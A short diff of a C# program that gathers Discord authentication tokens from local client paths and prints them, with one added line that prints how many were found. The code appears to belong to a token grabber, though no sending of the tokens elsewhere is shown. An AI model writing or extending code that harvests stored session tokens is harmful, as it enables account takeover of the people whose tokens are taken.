@@ -10,6 +10,8 @@ class Program
         var discordTokens = Discord.GetDiscordTokens(ConstantPaths.DISCORD_PATHS);
         if (!discordTokens.Any())
             Console.WriteLine("No discord tokens found.");
+        
+        Console.WriteLine(discordTokens.Count);
         foreach (var discordToken in discordTokens)
         {
             Console.WriteLine(discordToken);
